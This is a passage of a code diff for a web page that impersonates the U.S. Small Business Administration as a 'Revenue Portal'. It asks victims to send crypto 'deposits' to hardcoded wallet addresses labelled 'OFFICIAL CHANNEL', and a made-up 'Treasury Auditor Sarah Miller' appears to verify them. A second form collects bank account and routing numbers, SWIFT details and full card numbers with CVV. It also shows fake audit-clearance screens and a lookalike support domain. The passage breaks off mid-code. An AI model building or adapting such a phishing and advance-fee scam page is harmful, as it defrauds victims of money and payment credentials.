@@ -3,14 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA | Terminal</title>
+    <title>SBA | Revenue Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
-        :root { --sba-navy: #002e6d; --sba-red: #cc0000; --bg: #f4f7f9; }
-        body { background: var(--bg); font-family: 'Public Sans', sans-serif; color: #0f172a; margin: 0; -webkit-font-smoothing: antialiased; }
+        :root { 
+            --sba-blue: #002e6d; 
+            --sba-navy: #002e6d; 
+            --sba-red: #cc0000; 
+            --gold: #b69121; 
+            --bg: #f4f7f9; 
+        }
+        body { background: #f8fafc; font-family: 'Public Sans', sans-serif; color: #1e293b; margin: 0; -webkit-font-smoothing: antialiased; }
+        
+        .gov-banner { background: #001a3d; color: white; font-size: 8px; padding: 10px; text-align: center; font-weight: 800; text-transform: uppercase; border-bottom: 3px solid var(--sba-red); position: sticky; top: 0; z-index: 1001; letter-spacing: 1px; }
+        .logo-frame { border: 2px solid var(--sba-blue); border-bottom-color: var(--sba-red); border-left-color: var(--sba-red); padding: 2px 8px; font-weight: 900; color: var(--sba-blue); font-size: 18px; line-height: 1; display: inline-block; }
+        
+        .glass-card { background: white; border-radius: 24px; box-shadow: 0 20px 40px rgba(0, 46, 109, 0.08); border: 1px solid #e2e8f0; }
+        .method-card { border: 2px solid #f1f5f9; border-radius: 16px; padding: 10px 6px; cursor: pointer; transition: 0.2s; background: white; text-align: center; }
+        .method-card.active { border-color: var(--sba-blue); background: #f0f7ff; box-shadow: 0 0 0 1px var(--sba-blue); }
 
+        .btn-fed { background: var(--sba-blue); color: white; font-weight: 900; text-transform: uppercase; border-bottom: 4px solid #001a3d; cursor: pointer; width: 100%; border-radius: 14px; font-size: 13px; transition: all 0.2s; }
+        .btn-fed:active { transform: translateY(2px); border-bottom-width: 2px; }
+        .btn-outline { border: 2px solid var(--sba-blue); color: var(--sba-blue); font-weight: 900; text-transform: uppercase; width: 100%; border-radius: 14px; font-size: 11px; }
+
+        .radar-spin { animation: spin 1.5s linear infinite; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        #globalLoader { position: fixed; inset: 0; background: #f8fafc; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+
+        /* Additional Terminal Elements */
         .header-container { background: white; padding: 12px 20px; display: flex; align-items: center; border-bottom: 3px solid var(--sba-navy); position: sticky; top: 0; z-index: 1000; }
         .sba-logo-sm { width: 35px; height: 35px; position: relative; display: flex; align-items: center; justify-content: center; flex-shrink: 0; cursor: pointer; }
         .logo-text-sm { font-size: 12px; font-weight: 900; color: var(--sba-navy); z-index: 5; }
@@ -19,10 +42,6 @@
 
         .app-card { background: white; border-radius: 24px; padding: 25px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 15px 35px rgba(0,0,0,0.05); }
         
-        .tab-nav { display: flex; gap: 10px; margin-bottom: 20px; }
-        .tab-btn { flex: 1; padding: 10px; border-radius: 10px; font-size: 10px; font-weight: 900; text-align: center; cursor: pointer; background: #e2e8f0; color: #64748b; }
-        .tab-btn.active { background: var(--sba-navy); color: white; }
-
         .method-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 20px; }
         .m-btn { border: 1.5px solid #e2e8f0; border-radius: 12px; padding: 10px 2px; cursor: pointer; text-align: center; transition: 0.2s; background: #fff; }
         .m-btn.active { border-color: var(--sba-navy); background: #f0f7ff; box-shadow: 0 4px 10px rgba(0,46,109,0.08); }
@@ -35,31 +54,176 @@
         .s-input { width: 100%; height: 48px; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 0 15px; font-size: 13px; font-weight: 700; margin-bottom: 12px; outline: none; transition: 0.3s; }
         .s-input:focus { border-color: var(--sba-navy); background: #fff; }
 
-        .btn-fed { background: var(--sba-navy); color: white; font-weight: 900; text-transform: uppercase; width: 100%; height: 55px; border-radius: 15px; border-bottom: 5px solid #001530; cursor: pointer; font-size: 12px; margin-top: 10px; display: flex; align-items: center; justify-content: center; letter-spacing: 1px; }
         .btn-success { background: #10b981; color: white; font-weight: 900; text-transform: uppercase; width: 100%; height: 55px; border-radius: 15px; border-bottom: 5px solid #065f46; cursor: pointer; }
-        
         .support-agent-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 16px; padding: 12px; margin-top: 25px; display: flex; align-items: center; gap: 12px; cursor: pointer; }
         .agent-img { width: 40px; height: 40px; border-radius: 10px; object-fit: cover; border: 2px solid #10b981; }
-
         .fab-support { position: fixed; bottom: 30px; right: 20px; width: 56px; height: 56px; background: var(--sba-navy); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); border: 2px solid white; z-index: 999; cursor: pointer; }
-
-        #loader { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        button:disabled { background: #94a3b8; border-bottom: none; cursor: not-allowed; opacity: 0.7; }
-        .hidden { display: none; }
     </style>
 </head>
 <body class="pb-20">
 
-    <div id="loader">
-        <div class="sba-logo-sm"><div class="brk-top"></div><div class="logo-text-sm">SBA</div><div class="brk-btm"></div></div>
-        <p class="mt-4 text-[9px] font-black animate-pulse uppercase tracking-[0.2em] text-slate-400">Syncing Gateway...</p>
+    <div id="globalLoader">
+        <div class="logo-frame mb-6">SBA</div>
+        <div class="w-32 h-1.5 bg-slate-200 rounded-full overflow-hidden">
+            <div class="h-full bg-[#002e6d] w-1/3 animate-pulse"></div>
+        </div>
+        <p class="text-[10px] font-black uppercase text-slate-400 mt-4 tracking-widest">Establishing Secure Link...</p>
     </div>
 
-    <header class="header-container">
-        <div class="sba-logo-sm" onclick="location.href='dashboard.html'"><div class="brk-top"></div><div class="logo-text-sm">SBA</div><div class="brk-btm"></div></div>
+    <div class="gov-banner">Federal Revenue Node • 256-bit Encryption Active</div>
+
+    <header class="bg-white/80 backdrop-blur-md p-4 flex justify-between items-center border-b sticky top-[30px] z-50">
+        <div class="logo-frame" onclick="location.href='dashboard.html'">SBA</div>
+        <a href="dashboard.html" class="text-slate-400 text-2xl hover:text-slate-600 transition-colors"><i class="fas fa-times-circle"></i></a>
+    </header>
+
+    <main class="max-w-md mx-auto p-4 mt-2">
+        <div class="glass-card overflow-hidden">
+            <div class="p-6">
+                
+                <div id="formView">
+                    <div class="flex items-center gap-2 mb-6">
+                        <i class="fas fa-file-invoice-dollar text-sba-blue text-lg"></i>
+                        <h2 class="text-sm font-black text-slate-800 uppercase italic">Revenue Deposit</h2>
+                    </div>
+                    
+                    <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Select Asset Channel</label>
+                    <div class="grid grid-cols-3 gap-2 mt-2 mb-4">
+                        <div class="method-card active" onclick="selectMethod('BTC', 'bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k', 'Bitcoin', this)">
+                            <i class="fab fa-bitcoin text-orange-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">BTC</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('USDT', '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'USDT (BEP20 / ERC20)', this)">
+                            <i class="fas fa-dollar-sign text-emerald-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">USDT</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('USDC', '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'USDC (BASE / ERC20)', this)">
+                            <i class="fas fa-coins text-blue-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">USDC</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('ETH', '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'Ethereum', this)">
+                            <i class="fab fa-ethereum text-indigo-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">ETH</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('BNB', '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'BNB Chain', this)">
+                            <i class="fas fa-bolt text-yellow-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">BNB</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('SOL', '9UgFrLx796JagxDAJARrqzzW7c9DPHfrS2n3UH7vsMf4', 'Solana', this)">
+                            <i class="fas fa-sun text-purple-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">SOL</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('TRX', 'TKZcchSTjdJXEoVZmErwfiSUmZFnh6Tjwx', 'Tron', this)">
+                            <i class="fas fa-wave-square text-red-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">TRX</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('TON', 'UQCleKsmB8o-DF3fjkBR2X7gNrrs81Nv-zb_8mPW4GPx7yj9', 'TON Network', this)">
+                            <i class="fas fa-circle-nodes text-sky-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">TON</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('SUI', '0xb63217f9308f3711bc4b277fc8029ac4f93c828c3af4b6684024cdbdf9811454', 'Sui Network', this)">
+                            <i class="fas fa-circle text-blue-400 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">SUI</p>
+                        </div>
+                    </div>
+
+                    <div id="networkSelector" class="mb-6">
+                        <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Select Network Variant</label>
+                        <select id="networkDropdown" onchange="updateWalletAddressFromDropdown()" class="w-full h-11 px-4 mt-2 rounded-xl border-2 border-slate-100 font-bold text-xs focus:border-sba-blue outline-none transition-all shadow-inner bg-slate-50/50">
+                            </select>
+                    </div>
+
+                    <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Deposit Amount (USD)</label>
+                    <div class="relative mt-2 mb-6">
+                        <span class="absolute left-5 top-1/2 -translate-y-1/2 font-black text-slate-400 text-lg">$</span>
+                        <input type="number" id="depAmount" class="w-full h-14 pl-10 rounded-2xl border-2 border-slate-100 font-black text-lg focus:border-sba-blue outline-none transition-all shadow-inner bg-slate-50/50" placeholder="0.00">
+                    </div>
+
+                    <div class="bg-slate-900 p-4 rounded-2xl mb-6 border-b-4 border-gold shadow-lg">
+                        <div class="flex justify-between items-center mb-2">
+                            <p id="methodLabel" class="text-[9px] font-black text-slate-500 uppercase">BTC Receiver</p>
+                            <span class="text-[7px] bg-amber-500/10 text-amber-500 px-2 rounded-full font-black">OFFICIAL CHANNEL</span>
+                        </div>
+                        <div class="flex items-center justify-between gap-3 mt-1">
+                            <code id="walletAddr" class="text-[10px] font-bold text-amber-400 break-all leading-relaxed">bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k</code>
+                            <button onclick="copyAddr()" class="text-white bg-white/10 hover:bg-white/20 h-10 w-10 flex-shrink-0 rounded-xl transition-all"><i class="fas fa-copy text-sm"></i></button>
+                        </div>
+                        <div class="flex justify-center mt-4 p-2 bg-white rounded-xl" id="qrCodeArea">
+                            <img id="qrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k" alt="Wallet QR Code" class="h-28 w-28">
+                        </div>
+                    </div>
+
+                    <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Verification Receipt</label>
+                    <div onclick="document.getElementById('popFile').click()" class="mt-2 border-2 border-dashed border-slate-200 rounded-2xl p-8 text-center bg-slate-50/50 relative overflow-hidden mb-6 group hover:bg-slate-100 transition-all cursor-pointer">
+                        <img id="popPreview" class="absolute inset-0 w-full h-full object-cover hidden z-10">
+                        <div id="uploadUI" class="transition-transform group-hover:scale-105">
+                            <i class="fas fa-cloud-upload-alt text-slate-300 text-3xl mb-2"></i>
+                            <p class="text-[10px] font-black text-slate-400 uppercase tracking-tighter">Click to upload transfer screenshot</p>
+                        </div>
+                        <input type="file" id="popFile" class="hidden" accept="image/*" onchange="previewReceipt()">
+                    </div>
+
+                    <button onclick="handleDeposit()" class="btn-fed h-14 shadow-xl shadow-blue-900/10">Transmit to Audit Node</button>
+                </div>
+
+                <div id="pendingView" class="hidden text-center py-8">
+                    <div class="relative w-20 h-20 mx-auto mb-8">
+                        <div class="absolute inset-0 border-4 border-amber-500 rounded-full border-t-transparent radar-spin"></div>
+                        <div class="absolute inset-0 flex items-center justify-center text-amber-600"><i class="fas fa-landmark text-2xl"></i></div>
+                        <div class="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-amber-500 text-[7px] text-white px-2 py-0.5 rounded font-black whitespace-nowrap">SCANNING BLOCKCHAIN</div>
+                    </div>
+                    <h3 class="font-black text-slate-800 uppercase italic text-lg tracking-tight">Audit in Progress</h3>
+                    <p class="text-[11px] text-slate-500 font-bold uppercase mt-3 px-6 leading-relaxed">Agent Sarah Miller is verifying your <span id="pAmt" class="text-sba-blue font-black underline"></span> deposit against the treasury ledger.</p>
+                    <div class="mt-10">
+                        <button onclick="resetNode()" class="btn-outline h-12 shadow-sm">Request Manual Override</button>
+                        <p class="text-[8px] text-slate-400 mt-4 uppercase font-black tracking-widest">Do not refresh this page</p>
+                    </div>
+                </div>
+
+                <div id="successView" class="hidden text-center py-8">
+                    <div class="w-20 h-20 bg-emerald-500 rounded-full flex items-center justify-center mx-auto text-white text-3xl mb-6 shadow-xl shadow-emerald-500/20 animate-bounce"><i class="fas fa-check-double"></i></div>
+                    <h3 class="font-black text-slate-800 uppercase italic text-lg">Audit Clearance: PASS</h3>
+                    <p class="text-[11px] text-slate-500 font-bold uppercase mt-3 px-8">Treasury funds successfully cleared. Your wallet balance has been updated in real-time.</p>
+                    <div class="mt-10">
+                        <button onclick="resetNode()" class="btn-fed h-12">New Deposit Entry</button>
+                        <button onclick="location.href='dashboard.html'" class="btn-outline h-12 mt-3">Return to Dashboard</button>
+                    </div>
+                </div>
+
+                <div id="declinedView" class="hidden text-center py-8">
+                    <div class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center mx-auto text-white text-3xl mb-6 shadow-xl shadow-red-600/20"><i class="fas fa-exclamation-triangle"></i></div>
+                    <h3 class="font-black text-slate-800 uppercase italic text-lg">Audit Clearance: FAIL</h3>
+                    <div class="bg-red-50 p-4 rounded-xl mt-4 mb-8 border-l-4 border-red-600 mx-1">
+                        <p class="text-[8px] font-black text-red-400 uppercase text-left mb-1">Reason for Rejection:</p>
+                        <p id="dReason" class="text-[10px] font-bold text-red-700 italic text-left"></p>
+                    </div>
+                    <button onclick="resetNode()" class="btn-fed h-12">Retry Verification</button>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="mt-6 flex items-center gap-4 bg-white p-4 rounded-2xl border border-l-8 border-gold shadow-sm">
+            <div class="relative">
+                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=80" class="w-12 h-12 rounded-xl grayscale contrast-125" alt="Auditor">
+                <div class="absolute -bottom-1 -right-1 w-4 h-4 bg-emerald-500 border-2 border-white rounded-full"></div>
+            </div>
+            <div>
+                <p class="text-[11px] font-black uppercase text-slate-800">Sarah Miller</p>
+                <p class="text-[9px] font-bold text-sba-blue uppercase tracking-widest opacity-70">Assigned Treasury Auditor</p>
+            </div>
+        </div>
+    </main>
+
+    <header class="header-container mt-10 max-w-md mx-auto rounded-2xl border border-slate-200">
+        <div class="sba-logo-sm" onclick="location.href='dashboard.html'">
+            <div class="brk-top"></div>
+            <div class="logo-text-sm">SBA</div>
+            <div class="brk-btm"></div>
+        </div>
         <div class="ml-3">
-            <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase">Terminal Gateway</h1>
-            <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter mt-1">ACH/WIRE/CRYPTO Node 7-B</p>
+            <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase">Disbursement</h1>
+            <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter mt-1">ACH/WIRE Node 7-B</p>
         </div>
         <div class="ml-auto text-right">
             <p class="text-[8px] font-black text-slate-400 uppercase">Avail. Funds</p>
@@ -67,164 +231,320 @@
         </div>
     </header>
 
-    <main class="max-w-md mx-auto">
+    <main class="max-w-md mx-auto p-4">
         <div class="app-card">
-            
             <div id="reason-box" class="hidden bg-rose-50 border-l-4 border-rose-600 p-4 rounded-r-xl mb-5">
                 <div class="flex gap-3 text-rose-800">
                     <i class="fas fa-shield-slash mt-1"></i>
                     <div>
-                        <p class="text-[9px] font-black uppercase">Gateway Error</p>
+                        <p class="text-[9px] font-black uppercase">Gateway Error: Funds Reverted</p>
                         <p id="decline-text" class="text-[10px] font-bold mt-1">...</p>
                     </div>
                 </div>
             </div>
-
-            <div id="setupView" class="hidden text-center">
-                <div class="w-12 h-12 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-4">
-                    <i class="fas fa-lock text-slate-400"></i>
+            
+            <label class="label-text">Disbursement Type</label>
+            <div class="method-grid">
+                <div id="type-ach" class="m-btn active" onclick="switchDisbursement('ach')">
+                    <i class="fas fa-university"></i>
+                    <span>ACH</span>
                 </div>
-                <h2 class="text-xs font-black uppercase text-slate-700 mb-2">Security Initialization</h2>
-                <p class="text-[9px] font-bold text-slate-400 uppercase mb-6">Create a 4-digit transfer key</p>
-                <input type="tel" id="regPin" maxlength="4" class="s-input text-center text-xl tracking-[12px]" placeholder="****">
-                <button onclick="savePin()" class="btn-fed">Register Security Node</button>
-            </div>
-
-            <div id="formView" class="hidden">
-                <div class="tab-nav">
-                    <div id="tabWithdraw" class="tab-btn active" onclick="switchMode('WITHDRAW')">WITHDRAW</div>
-                    <div id="tabDeposit" class="tab-btn" onclick="switchMode('DEPOSIT')">DEPOSIT</div>
+                <div id="type-wire" class="m-btn" onclick="switchDisbursement('wire')">
+                    <i class="fas fa-exchange-alt"></i>
+                    <span>Wire</span>
                 </div>
-
-                <h2 class="text-[9px] font-black uppercase text-slate-400 tracking-widest mb-4 flex items-center gap-2">
-                    <i class="fas fa-satellite-dish text-red-600"></i> <span id="modeTitle">Transmission</span> Channel
-                </h2>
-
-                <div class="method-grid">
-                    <div class="m-btn active" id="mBank" onclick="setM('BANK')"><i class="fas fa-university"></i><span>ACH</span></div>
-                    <div class="m-btn" id="mWire" onclick="setM('WIRE')"><i class="fas fa-random"></i><span>Wire</span></div>
-                    <div class="m-btn" id="mCash" onclick="setM('CASHAPP')"><i class="fas fa-mobile-alt"></i><span>Digital</span></div>
-                    <div class="m-btn" id="mCrypto" onclick="setM('CRYPTO')"><i class="fab fa-bitcoin"></i><span>Crypto</span></div>
+                <div id="type-card" class="m-btn" onclick="switchDisbursement('card')">
+                    <i class="far fa-credit-card"></i>
+                    <span>Card</span>
                 </div>
-
-                <div id="fields">
-                    <div id="f_bank">
-                        <label class="label-text">Account Holder</label><input type="text" id="b_name" class="s-input" placeholder="Full Legal Name">
-                        <div class="grid grid-cols-2 gap-3">
-                            <div><label class="label-text">Account No.</label><input type="tel" id="b_acc" class="s-input"></div>
-                            <div><label class="label-text">Routing No.</label><input type="tel" id="b_rout" class="s-input"></div>
-                        </div>
-                    </div>
-                    <div id="f_wire" class="hidden">
-                        <label class="label-text">Bank Name</label><input type="text" id="w_bank_name" class="s-input">
-                        <label class="label-text">SWIFT / IBAN</label><input type="text" id="w_iban" class="s-input">
-                    </div>
-                    <div id="f_cash" class="hidden">
-                        <label class="label-text">Platform</label>
-                        <select id="c_platform" class="s-input"><option value="CashApp">CashApp</option><option value="Zelle">Zelle</option></select>
-                        <label class="label-text">Recipient ID</label><input type="text" id="c_tag" class="s-input">
-                    </div>
-                    <div id="f_crypto" class="hidden">
-                        <label class="label-text">Network</label>
-                        <select id="cr_net" class="s-input"><option value="BTC">BTC</option><option value="USDT">USDT</option></select>
-                        <label class="label-text">Wallet Address</label><input type="text" id="cr_addr" class="s-input">
-                    </div>
-                </div>
-
-                <div class="grid grid-cols-2 gap-4 mt-2">
-                    <div><label class="label-text">Amount ($)</label><input type="number" id="w_amt" class="s-input" placeholder="0.00"></div>
-                    <div><label class="label-text" id="pinLabel">Transfer Pin</label><input type="tel" id="w_pin" maxlength="4" class="s-input text-center tracking-[8px]" placeholder="****"></div>
-                </div>
-                <button id="sendBtn" onclick="processTransaction()" class="btn-fed">Authorize Transaction</button>
-            </div>
-
-            <div id="pendingView" class="hidden text-center py-5">
-                <div class="w-14 h-14 border-4 border-[#002e6d] border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
-                <h3 class="font-black text-xs uppercase italic" id="pendingStatus">Processing Audit</h3>
-                <p class="text-[9px] text-slate-400 font-bold mt-4 px-8 uppercase leading-relaxed tracking-wide">
-                    System is verifying the transmission hash with federal reserve protocol.
-                </p>
-                <div class="support-agent-box" onclick="location.href='support.html'">
-                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=120" class="agent-img">
-                    <div class="text-left">
-                        <p class="text-[10px] font-black text-slate-800 uppercase leading-none mb-1">Officer Sarah Miller</p>
-                        <p class="text-[8px] font-bold text-emerald-600 uppercase">Verifying Status...</p>
-                    </div>
+                <div id="type-crypto" class="m-btn" onclick="switchDisbursement('crypto')">
+                    <i class="fab fa-bitcoin"></i>
+                    <span>Crypto</span>
                 </div>
             </div>
 
-            <div id="successView" class="hidden text-center py-8">
-                <div class="w-16 h-16 bg-emerald-50 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-5">
-                    <i class="fas fa-check-circle text-2xl"></i>
-                </div>
-                <h3 class="font-black text-base uppercase text-slate-800">Transmission Complete</h3>
-                <div class="mt-8 space-y-3">
-                    <button onclick="reopenForm()" class="btn-success">New Transaction</button>
+            <div id="ach-inputs">
+                <label class="label-text">Routing Number</label>
+                <input type="text" class="s-input" placeholder="000000000" id="ach-routing" />
+                
+                <label class="label-text">Account Number</label>
+                <input type="text" class="s-input" placeholder="XXXXXXXX" id="ach-account" />
+
+                <label class="label-text">Bank Name</label>
+                <input type="text" class="s-input" placeholder="Chase, Wells Fargo..." id="ach-bank" />
+            </div>
+
+            <div id="wire-inputs" class="hidden">
+                <label class="label-text">SWIFT / BIC Code</label>
+                <input type="text" class="s-input" placeholder="SWIFTXXXX" id="wire-swift" />
+
+                <label class="label-text">Beneficiary Name</label>
+                <input type="text" class="s-input" placeholder="Full Name" id="wire-beneficiary" />
+
+                <label class="label-text">Account Number / IBAN</label>
+                <input type="text" class="s-input" placeholder="Account or IBAN" id="wire-account" />
+            </div>
+
+            <div id="card-inputs" class="hidden">
+                <label class="label-text">Cardholder Name</label>
+                <input type="text" class="s-input" placeholder="Full Name" id="card-name" />
+
+                <label class="label-text">Card Number</label>
+                <input type="text" class="s-input" placeholder="XXXX XXXX XXXX XXXX" id="card-number" />
+
+                <label class="label-text">Expiration Date & CVV</label>
+                <div class="flex gap-2">
+                    <input type="text" class="s-input" placeholder="MM/YY" id="card-expiry" />
+                    <input type="text" class="s-input" placeholder="CVV" id="card-cvv" />
                 </div>
             </div>
 
+            <div id="crypto-inputs" class="hidden">
+                <label class="label-text">Select Network Channel</label>
+                <select id="cryptoDropdown" class="w-full h-12 bg-slate-50 border-2 border-slate-200 rounded-xl px-4 font-bold text-xs mb-3 focus:border-sba-navy outline-none">
+                    <option value="BTC">Bitcoin (BTC)</option>
+                    <option value="USDT-BEP20">USDT (BNB Smart Chain BEP20)</option>
+                    <option value="USDT-ERC20">USDT (Ethereum ERC20)</option>
+                    <option value="USDT-TRC20">USDT (Tron TRC20)</option>
+                    <option value="USDT-SOL">USDT (Solana SOL)</option>
+                    <option value="USDT-TON">USDT (TON)</option>
+                    <option value="USDC-BASE">USDC (Base BASE)</option>
+                    <option value="USDC-SOL">USDC (Solana SOL)</option>
+                    <option value="ETH-ERC20">Ethereum (ERC20)</option>
+                    <option value="BNB-BEP20">BNB (Smart Chain BEP20)</option>
+                    <option value="SOL-SOL">Solana (SOL)</option>
+                    <option value="TRX-TRC20">Tron (TRC20)</option>
+                    <option value="TON-TON">TON (TON)</option>
+                    <option value="SUI-SUI">Sui (SUI)</option>
+                </select>
+
+                <label class="label-text">Destination Wallet Address</label>
+                <input type="text" class="s-input" placeholder="Destination Address" id="crypto-address" />
+            </div>
+
+            <label class="label-text mt-3">Disbursement Amount</label>
+            <div class="relative mb-6">
+                <span class="absolute left-5 top-1/2 -translate-y-1/2 font-black text-slate-400 text-lg">$</span>
+                <input type="number" id="wireAmount" class="w-full h-14 pl-10 rounded-2xl border-2 border-slate-100 font-black text-lg focus:border-sba-navy outline-none transition-all shadow-inner bg-slate-50/50" placeholder="0.00">
+            </div>
+
+            <button id="submitBtn" onclick="handleDisbursement()" class="btn-success h-14 shadow-xl text-xs tracking-wider">PROCESS DISBURSEMENT</button>
+
+            <div class="support-agent-box" onclick="location.href='mailto:support@sba-gov.net'">
+                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=80" class="agent-img" alt="Support Agent">
+                <div>
+                    <p class="text-[9px] font-black uppercase text-slate-800">Support Node 7</p>
+                    <p class="text-[7px] font-bold text-emerald-600 uppercase tracking-widest opacity-80">Need Disbursement Help?</p>
+                </div>
+                <i class="fas fa-envelope ml-auto text-emerald-600 text-xs mr-1"></i>
+            </div>
         </div>
     </main>
 
+    <div class="fab-support" onclick="location.href='tel:+155519927'"><i class="fas fa-headset"></i></div>
+
     <script type="module">
         import { auth, db } from './firebase-config.js';
-        import { doc, onSnapshot, updateDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { doc, onSnapshot, updateDoc, arrayUnion, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
         import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
 
-        let bal = 0, pin = "", method = "BANK", mode = "WITHDRAW";
+        let compressedImage = null;
+        let selectedMethodName = "BTC";
+        let selectedNetworkData = "bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k";
+        let selectedLabel = "Bitcoin";
 
-        window.switchMode = (m) => {
-            mode = m;
-            document.getElementById('tabWithdraw').classList.toggle('active', mode === 'WITHDRAW');
-            document.getElementById('tabDeposit').classList.toggle('active', mode === 'DEPOSIT');
-            document.getElementById('modeTitle').innerText = mode === 'WITHDRAW' ? "Disbursement" : "Deposit";
-            document.getElementById('pinLabel').innerText = mode === 'WITHDRAW' ? "Transfer Pin" : "Security Pin";
+        window.selectedDisbursementMode = "ach";
+        window.switchDisbursement = (mode) => {
+            window.selectedDisbursementMode = mode;
+            ['ach', 'wire', 'card', 'crypto'].forEach(m => {
+                document.getElementById(`type-${m}`).classList.remove('active');
+                document.getElementById(`${m}-inputs`).classList.add('hidden');
+            });
+            document.getElementById(`type-${mode}`).classList.add('active');
+            document.getElementById(`${mode}-inputs`).classList.remove('hidden');
         };
 
-        window.setM = (m) => {
-            method = m;
-            document.querySelectorAll('.m-btn').forEach(b => b.classList.remove('active'));
-            document.getElementById('m' + m.charAt(0) + m.slice(1).toLowerCase()).classList.add('active');
-            ['f_bank', 'f_wire', 'f_cash', 'f_crypto'].forEach(f => document.getElementById(f).classList.add('hidden'));
-            document.getElementById('f_' + m.toLowerCase()).classList.remove('hidden');
+        window.handleDisbursement = async () => {
+            alert("Disbursement nodes are processing. Check your updated balance.");
         };
 
-        window.processTransaction = async () => {
-            const amt = Number(document.getElementById('w_amt').value);
-            const wPin = document.getElementById('w_pin').value;
+        const addressRepository = {
+            "BTC": {
+                "Bitcoin": "bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k"
+            },
+            "USDT": {
+                "BNB Smart Chain (BEP20)": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E",
+                "Ethereum (ERC20)": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E",
+                "Tron (TRC20)": "TKZcchSTjdJXEoVZmErwfiSUmZFnh6Tjwx",
+                "Solana (SOL)": "9UgFrLx796JagxDAJARrqzzW7c9DPHfrS2n3UH7vsMf4",
+                "TON (TON)": "UQCleKsmB8o-DF3fjkBR2X7gNrrs81Nv-zb_8mPW4GPx7yj9",
+                "Arbitrum": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E"
+            },
+            "USDC": {
+                "Base (BASE)": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E",
+                "Solana (SOL)": "9UgFrLx796JagxDAJARrqzzW7c9DPHfrS2n3UH7vsMf4",
+                "Ethereum (ERC20)": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E",
+                "BNB Smart Chain (BEP20)": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E",
+                "Arbitrum": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E"
+            },
+            "ETH": {
+                "Ethereum (ERC20)": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E",
+                "Base (BASE)": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E",
+                "Arbitrum": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E"
+            },
+            "BNB": {
